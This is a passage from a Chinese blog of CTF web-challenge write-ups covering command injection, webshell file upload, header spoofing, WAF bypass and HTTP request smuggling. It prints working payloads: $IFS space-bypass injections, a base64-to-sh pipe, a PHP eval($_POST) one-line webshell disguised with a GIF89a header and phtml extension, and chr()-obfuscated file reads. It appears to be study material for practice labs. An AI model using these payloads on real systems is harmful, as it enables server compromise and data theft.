<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102004540.png" alt="image-20220110200415489"></p>

        <h2 id="2-绕过过滤"   >
          <a href="#2-绕过过滤" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-绕过过滤" class="headerlink" title="2.绕过过滤"></a>2.绕过过滤</h2>
      <p>应该是过滤的空格</p>
<p>▲绕过空格：一般思路如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //其中那个1加其他的应该都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;</span><br><span class="line">$20</span><br><span class="line">$09(空字符)</span><br></pre></td></tr></table></div></figure>

<p>参考[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/12313368.html" >GXYCTF2019]Ping Ping Ping - 春告鳥 - 博客园 (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>使用<code>$IFS</code>可以，但是又发现过滤了flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102021256.png" alt="image-20220110202147216"></p>
<p>那么接下的解法就多种多样了。</p>

        <h3 id="解法一：拼接flag"   >
          <a href="#解法一：拼接flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#解法一：拼接flag" class="headerlink" title="解法一：拼接flag"></a>解法一：拼接flag</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?ip=127.0.0.1;b=ag.php;a=fl;cat$IFS$1$a$b</span><br></pre></td></tr></table></div></figure>

<p>flag在注释里，查看网页源代码即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111127902.png" alt="image-20220111112715736"></p>

        <h3 id="解法二：sh结合base64"   >
          <a href="#解法二：sh结合base64" class="heading-link"><i class="fas fa-link"></i></a><a href="#解法二：sh结合base64" class="headerlink" title="解法二：sh结合base64"></a>解法二：sh结合base64</h3>
      
        <h4 id="▲linux自带base64和base32"   >
          <a href="#▲linux自带base64和base32" class="heading-link"><i class="fas fa-link"></i></a><a href="#▲linux自带base64和base32" class="headerlink" title="▲linux自带base64和base32"></a>▲linux自带base64和base32</h4>
      <p>由于linux的sh自带base64的加解密，所以我们可以传入base64的密文，然后利用linux的sh终端自带的base64解密功能进行解密，这样可以在一定程度上绕过很多过滤，另外base32也可以</p>

        <h4 id="1-base64加密"   >
          <a href="#1-base64加密" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-base64加密" class="headerlink" title="(1)base64加密"></a>(1)base64加密</h4>
      <p>使用CyberChef或者linux命令行都行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111136396.png" alt="image-20220111113614306"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111136522.png" alt="image-20220111113634402"></p>

        <h4 id="2-base64解密"   >
          <a href="#2-base64解密" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-base64解密" class="headerlink" title="(2)base64解密"></a>(2)base64解密</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo Y2F0IGZsYWcucGhwCg== | base64 -d | sh</span><br></pre></td></tr></table></div></figure>

<p>将之前加密的”cat flag.php”传给base64解密，然后sh执行</p>
<p>对应写在URL上即为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh</span><br></pre></td></tr></table></div></figure>


        <h3 id="解法三：linux内联执行"   >
          <a href="#解法三：linux内联执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#解法三：linux内联执行" class="headerlink" title="解法三：linux内联执行"></a>解法三：linux内联执行</h3>
      <p>命令中会先执行反引号里的，然后将输入结果依次传递给其他命令进行执行</p>
<p>由于flag就在当前文件夹下，所以</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat `ls`;</span><br><span class="line"><span class="comment">#先执行ls输出 index.php 和 flag.php，之后将输入结果给到cat命令，相当于再执行 cat index.php;cat flag.php</span></span><br></pre></td></tr></table></div></figure>

<p>对应URL为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></div></figure>


        <h2 id="▲其他"   >
          <a href="#▲其他" class="heading-link"><i class="fas fa-link"></i></a><a href="#▲其他" class="headerlink" title="▲其他"></a>▲其他</h2>
      <p>此外命令执行有很多方法可以绕过，这里ban掉了很多，像<code>&lt;</code>，<code>\</code>等都是有可能</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/GLory-LTF/p/15359485.html" >命令执行绕过的方法 - GLCC - 博客园 (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="十一、-极客大挑战-2019-Knife"   >
          <a href="#十一、-极客大挑战-2019-Knife" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、-极客大挑战-2019-Knife" class="headerlink" title="十一、[极客大挑战 2019]Knife"></a>十一、[极客大挑战 2019]Knife</h1>
      
        <h2 id="🔺一句话木马"   >
          <a href="#🔺一句话木马" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺一句话木马" class="headerlink" title="🔺一句话木马"></a>🔺一句话木马</h2>
      <p>依据提示以及如下的语句，猜测是一句话木马，密码为Syc</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111449555.png" alt="image-20220111144925504"></p>
<p>使用蚁剑连接</p>
<p>蚁剑教程：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/antswordproject/antsword/srruro" >获取蚁剑 · 语雀 (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>然后直接复制URL进行连接即可，右键-&gt;添加数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111451527.png" alt="image-20220111145119474"></p>
<p>进去之后进入根目录寻找flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111451771.png" alt="image-20220111145143729"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111452893.png" alt="image-20220111145208831"></p>

        <h1 id="十二、-极客大挑战-2019-Http"   >
          <a href="#十二、-极客大挑战-2019-Http" class="heading-link"><i class="fas fa-link"></i></a><a href="#十二、-极客大挑战-2019-Http" class="headerlink" title="十二、[极客大挑战 2019]Http"></a>十二、[极客大挑战 2019]Http</h1>
      
        <h2 id="🔺使用BurpSuit改包头"   >
          <a href="#🔺使用BurpSuit改包头" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺使用BurpSuit改包头" class="headerlink" title="🔺使用BurpSuit改包头"></a>🔺使用BurpSuit改包头</h2>
      
        <h2 id="1-前期探索-2"   >
          <a href="#1-前期探索-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前期探索-2" class="headerlink" title="1.前期探索"></a>1.前期探索</h2>
      <p>直接源代码，搜索.php，发现一个Secrect.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111412036.png" alt="image-20220111141159974"></p>
<p>然后访问，发现需要从<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn访问才行/" >https://Sycsecret.buuoj.cn访问才行</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111412596.png" alt="image-20220111141218518"></p>
<p>那么就使用BurpSuite进行修改</p>

        <h2 id="2-BurpSuite使用改包"   >
          <a href="#2-BurpSuite使用改包" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-BurpSuite使用改包" class="headerlink" title="2.BurpSuite使用改包"></a>2.BurpSuite使用改包</h2>
      <p>首先浏览器开启代理，BurpSuite抓到包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111413501.png" alt="image-20220111141339457"></p>
<p>然后将包发送到<code>repeater</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111414701.png" alt="image-20220111141424655"></p>
<p>在Repeater最新出现的一部分就是</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111415489.png" alt="image-20220111141531436"></p>

        <h3 id="1-修改Referer"   >
          <a href="#1-修改Referer" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-修改Referer" class="headerlink" title="(1)修改Referer"></a>(1)修改Referer</h3>
      <p>由于说要从<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn访问,所以添加如下,在get下添加/" >https://Sycsecret.buuoj.cn访问，所以添加如下，在Get下添加</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://Sycsecret.buuoj.cn</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111417813.png" alt="image-20220111141726767"></p>
<p>点击Go按钮发送包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111418470.png" alt="image-20220111141823417"></p>
<p>返回的包提示不行，那么需要修改浏览器名称</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111418007.png" alt="image-20220111141837951"></p>

        <h3 id="2-修改User-Agent"   >
          <a href="#2-修改User-Agent" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-修改User-Agent" class="headerlink" title="(2)修改User-Agent"></a>(2)修改User-Agent</h3>
      <p>修改如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Syclover</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111420138.png" alt="image-20220111142004093"></p>
<p>还是不行，提示需要从本地local读取</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111420811.png" alt="image-20220111142051767"></p>

        <h3 id="3-修改X-Forwarded-For"   >
          <a href="#3-修改X-Forwarded-For" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-修改X-Forwarded-For" class="headerlink" title="(3)修改X-Forwarded-For"></a>(3)修改X-Forwarded-For</h3>
      <p>添加如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111422737.png" alt="image-20220111142201689"></p>
<p>发送后得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111422352.png" alt="image-20220111142221310"></p>

        <h1 id="十三、-极客大挑战-2019-Upload"   >
          <a href="#十三、-极客大挑战-2019-Upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#十三、-极客大挑战-2019-Upload" class="headerlink" title="十三、[极客大挑战 2019]Upload"></a>十三、[极客大挑战 2019]Upload</h1>
      
        <h2 id="🔺文件上传漏洞、一句话木马"   >
          <a href="#🔺文件上传漏洞、一句话木马" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺文件上传漏洞、一句话木马" class="headerlink" title="🔺文件上传漏洞、一句话木马"></a>🔺文件上传漏洞、一句话木马</h2>
      
        <h2 id="1-前期探索-3"   >
          <a href="#1-前期探索-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前期探索-3" class="headerlink" title="1.前期探索"></a>1.前期探索</h2>
      <p>进入之后发现让选择图片进行上传，那么就考虑一句话木马的隐写，然后再上传</p>
<p>首先尝试上传.php文件，失败，接着考虑测绕过。</p>

        <h2 id="2-绕过过滤-1"   >
          <a href="#2-绕过过滤-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-绕过过滤-1" class="headerlink" title="2.绕过过滤"></a>2.绕过过滤</h2>
      
        <h3 id="1-修改Content-Type"   >
          <a href="#1-修改Content-Type" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-修改Content-Type" class="headerlink" title="(1)修改Content-Type"></a>(1)修改Content-Type</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121202373.png" alt="image-20220112120212319"></p>
<p>失败，后缀名不能为.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121202287.png" alt="image-20220112120239252"></p>

        <h3 id="2-修改后缀名"   >
          <a href="#2-修改后缀名" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-修改后缀名" class="headerlink" title="(2)修改后缀名"></a>(2)修改后缀名</h3>
      <p>修改为phtml，这种格式在服务器也会被作为php文件解析。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121204190.png" alt="image-20220112120451143"></p>
<p>成功，但是不能是<code>&lt;?</code>开头，那么尝试使用html格式。还有的php文件后缀名可以修改如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- 利用中间件解析漏洞绕过检查，实战常用</span><br><span class="line">- 上传.user.ini或.htaccess将合法拓展名文件当作php文件解析</span><br><span class="line">- %00截断绕过</span><br><span class="line">- php3文件</span><br><span class="line">- php4文件</span><br><span class="line">- php5文件</span><br><span class="line">- php7文件</span><br><span class="line">- phtml文件</span><br><span class="line">- phps文件</span><br><span class="line">- pht文件</span><br></pre></td></tr></table></div></figure>

<p>[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/12403922.html" >BUUOJ记录] [ACTF2020 新生赛]Upload - Ye’sBlog - 博客园 (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="3-修改php格式"   >
          <a href="#3-修改php格式" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-修改php格式" class="headerlink" title="(3)修改php格式"></a>(3)修改php格式</h3>
      <p>修改内容为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121206053.png" alt="image-20220112120616999"></p>
<p>成功，但是也被探测到，那么尝试修改文件头部格式</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121207056.png" alt="image-20220112120712009"></p>

        <h3 id="4-尝试修改文件头部"   >
          <a href="#4-尝试修改文件头部" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-尝试修改文件头部" class="headerlink" title="(4)尝试修改文件头部"></a>(4)尝试修改文件头部</h3>
      <p>在文件头加上<code>GIF89a</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121210799.png" alt="image-20220112121007758"></p>
<p>上传成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121210905.png" alt="image-20220112121056862"></p>

        <h2 id="3-查找上传文件路径"   >
          <a href="#3-查找上传文件路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-查找上传文件路径" class="headerlink" title="3.查找上传文件路径"></a>3.查找上传文件路径</h2>
      <p>一般而言，上传的都在upload，成功找到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121213219.png" alt="image-20220112121305153"></p>
<p>那么蚁剑连接，根目录下找到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121218740.png" alt="image-20220112121815697"></p>

        <h1 id="十四、-ACTF2020-新生赛-Upload"   >
          <a href="#十四、-ACTF2020-新生赛-Upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#十四、-ACTF2020-新生赛-Upload" class="headerlink" title="十四、[ACTF2020 新生赛]Upload"></a>十四、[ACTF2020 新生赛]Upload</h1>
      <p>和十三题一样，直接一句话木马，文件格式为phtml，修改content-type即可，然后蚁剑连上在根目录下找flag。需要注意的是要先上传成功一个文件才会抓到上传的包，因为这里的验证是在前端验证后缀名的。</p>

        <h1 id="十五、-RoarCTF-2019-Easy-Calc"   >
          <a href="#十五、-RoarCTF-2019-Easy-Calc" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、-RoarCTF-2019-Easy-Calc" class="headerlink" title="十五、[RoarCTF 2019]Easy Calc"></a>十五、[RoarCTF 2019]Easy Calc</h1>
      
        <h2 id="🔺命令执行、php字符串解析、HTTP走私攻击"   >
          <a href="#🔺命令执行、php字符串解析、HTTP走私攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺命令执行、php字符串解析、HTTP走私攻击" class="headerlink" title="🔺命令执行、php字符串解析、HTTP走私攻击"></a>🔺命令执行、php字符串解析、HTTP走私攻击</h2>
      
        <h2 id="1-前期探索-4"   >
          <a href="#1-前期探索-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前期探索-4" class="headerlink" title="1.前期探索"></a>1.前期探索</h2>
      <p>查看源代码，发现如下.php文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121906058.png" alt="image-20220112190657868"></p>
<p>访问一下，发现源代码，分析过滤了一些东西，然后我们输入的num字符串进行解析，并且使用eval执行后输出</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121912749.png" alt="image-20220112191231694"></p>
<p>主要以下代码，过滤了很多东西，然后执行输出</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>)</span><br></pre></td></tr></table></div></figure>

<p>尝试phpinfo()，发现直接报错，大佬们说是Waf的原因，具体也不太知道怎么判断出Waf的，经过测试，这里的waf会过滤掉所有带字母的num变量内容。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131203691.png" alt="image-20220113115855930"></p>
<p>所以大概有两种方法</p>

        <h2 id="2-解决方法"   >
          <a href="#2-解决方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-解决方法" class="headerlink" title="2.解决方法"></a>2.解决方法</h2>
      
        <h3 id="解法一：利用php字符串解析特性绕过WAF"   >
          <a href="#解法一：利用php字符串解析特性绕过WAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#解法一：利用php字符串解析特性绕过WAF" class="headerlink" title="解法一：利用php字符串解析特性绕过WAF"></a>解法一：利用php字符串解析特性绕过WAF</h3>
      
        <h4 id="1-绕过WAF"   >
          <a href="#1-绕过WAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-绕过WAF" class="headerlink" title="(1)绕过WAF"></a>(1)绕过WAF</h4>
      <p>利用php解析字符串时，会自动去掉多余的空格这个特性，即当我们调试时</p>
<p>输入中间加入了空格的num，发现php依然能够成功解析出num这个变量</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?%20num=phpinfo()</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131156038.png" alt="image-20220113115626996"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131156886.png" alt="image-20220113115655830"></p>
<p>但是WAF可不会管空不空格的，对于Waf来说，传过去的是带了空格的num变量，不是num变量，所以不会进行过滤，会将带了空格的num变量传递给calc.php文件进行解析，这样就成功绕过了WAF。</p>

        <h4 id="2-绕过过滤-2"   >
          <a href="#2-绕过过滤-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-绕过过滤-2" class="headerlink" title="(2)绕过过滤"></a>(2)绕过过滤</h4>
      <p>由于过滤了<code>/</code>，所以这里使用<code>chr(47)</code>来进行绕过，这是<code>/</code>字符的ascii码</p>
<p>先查看根目录下有什么内容</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?%20num=var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></div></figure>

<p>发现有flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131211277.png" alt="image-20220113121152229"></p>
<p>那么利用php中的函数进行获取</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></div></figure>

<p>得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131212797.png" alt="image-20220113121256750"></p>

        <h3 id="解法二：利用HTTP走私攻击"   >
          <a href="#解法二：利用HTTP走私攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#解法二：利用HTTP走私攻击" class="headerlink" title="解法二：利用HTTP走私攻击"></a>解法二：利用HTTP走私攻击</h3>
      <p>这个具体的原理实在是有点不太能理解，可能需要深入研究一下。以我的理解来说，就是通过修改<code>content-length</code>或者<code>Transfer-Encoding</code>，来使得数据包在前后端解析的过程中，让前端以为该数据包的内容比较少，使其认为不包含需要过滤的内容，从而把完整的数据包发给后端，绕过前端的Waf等过滤。</p>
<p>BurpSuit抓包之后，修改<code>content-length</code>或者<code>Transfer-Encoding</code></p>

        <h4 id="1-利用CL-CL"   >
          <a href="#1-利用CL-CL" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-利用CL-CL" class="headerlink" title="(1)利用CL-CL"></a>(1)利用CL-CL</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131507999.png" alt="image-20220113150704935"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 0</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></div></figure>


        <h4 id="2-利用CL-TE"   >
          <a href="#2-利用CL-TE" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用CL-TE" class="headerlink" title="(2)利用CL-TE"></a>(2)利用CL-TE</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131518370.png" alt="image-20220113151848304"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 3</span><br></pre></td></tr></table></div></figure>

<p>有时候又很奇怪，就离谱。</p>
<p>同时GET改成POST也是可以的。</p>
<p>后面都一样了，就是绕过后端的过滤。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.html" >4.17. HTTP 请求走私 — Web安全学习笔记 1.0 文档 (websec.readthedocs.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">118</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">62</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">60</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

